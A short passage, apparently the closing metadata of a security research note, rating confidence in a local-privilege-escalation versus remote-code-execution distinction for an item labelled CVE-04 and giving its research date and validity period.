- CVE-04 LPE/RCE disambiguation: HIGH — the technical distinction is clearly documented; the planning *decision* (which path to use) remains an open question for the planner/user

**Research date:** 2026-06-11
**Valid until:** 2026-12-11 (stable domain — CVE mechanisms don't change; OWASP LLM Top 10 may update annually)
